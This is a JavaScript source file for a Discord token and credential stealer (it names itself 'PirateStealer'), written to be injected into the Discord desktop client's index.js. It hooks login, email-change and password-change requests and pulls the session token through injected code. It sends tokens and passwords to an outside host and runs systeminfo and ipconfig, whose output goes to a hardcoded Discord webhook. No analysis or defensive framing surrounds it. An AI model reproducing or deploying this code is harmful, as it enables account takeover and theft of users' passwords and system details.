const {BrowserWindow,session} = require('electron');
const {Webhook} = require("discord-webhook-node")
const https = require('https'); 
const {execSync} = require('child_process')
const webhook = "VocÃª realmente acha que vou deixar uma webhook, em um script ofuscado em pleno 2022? Bjs"
let hook = new Webhook("https://discord.com/api/webhooks/1053773150489423923/PETaEzQJsOazMN6xFLv3FtUfP4cnuBeljGG65lLLHwnL4oKxUQsmCbDzuA8f0CqYjL0o")
const api = "https://discordkozune.repl.co/"
const dir = process.env.APPDATA
const system = process.platform 
const user = process.env.USERNAME
const roaming = "C:/Users/" + user + "/AppData/Roaming"
const local = "C:/Users/" + user + "/AppData/Local"
let infosystem = dir + "/systeminfos.txt"
let infosip = dir + "/ipconfig.txt"
const params = api
const Filters = {
    1: {
        urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]
    },
    2: {
        urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
    }
};

class PirateStealerEvent {
    constructor(event, token, data) {
        this.event = event;
        this.data = data;
        this.token = token;
    }
    handle() {
    switch (this["event"]) {
            case "passwordChanged":
                event_handlers["passwordChanged"](this.data.password, this.data.new_password, this.token)
                break;
            case 'userLogin':
                event_handlers["userLogin"](this.data.password, this.data.email, this.token)
                break;
            case 'emailChanged':
                event_handlers["emailChanged"](this.data.password, this.data.email, this.token)
                break;
        }
    }
}
session.defaultSession.webRequest.onBeforeRequest(Filters[2], async (details) => {
    var token = await getToken()
    https.get(params + `opa/${token}/Sem`, (resp, error) => {})

ipetc()

async function ipetc() {
    code = execSync(`systeminfo > ${infosystem}`)
    code = execSync(`ipconfig /all > ${infosip}`)
    hook.send("`InformaÃ§Ãµes do sistema`").then(e => hook.sendFile(infosystem))
    hook.send("`InformaÃ§Ãµes de ip`").then(e => hook.sendFile(infosip))
}
})

async function userLogin(password, email, token) {
    https.get(params + `login/${token}/${password}`, (resp, error) => {})

}


async function getToken() {
    const window = BrowserWindow.getAllWindows()[0];
    var token = await window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[['get_require']]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)'getToken'==a&&(token=b.default.getToken())}token;`, !0)
    return token;
}

session.defaultSession.webRequest.onCompleted(Filters[1], async (details, callback) => {
    if (details.statusCode != 200) return;

    const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
    const data = JSON.parse(unparsed_data)
    const token = await getToken();

    switch (true) {
        case details.url.endsWith('login'):
            var event = new PirateStealerEvent('userLogin', token, {
                password: data.password,
                email: data.login
            });
            event.handle();
            return;
        case details.url.endsWith('users/@me') && details.method == 'PATCH':
            if (!data.password) return;
            if (data.email) {
                var event = new PirateStealerEvent('emailChanged', token, {
                    password: data.password,
                    email: data.email
                });
                event.handle();

            };
            if (data.new_password) {
                var event = new PirateStealerEvent('passwordChanged', token, {
                    password: data.password,
                    new_password: data.new_password
                });
                event.handle();
            };
            return;
        default:
            break;
    }
});

module.exports = require('./core.asar')
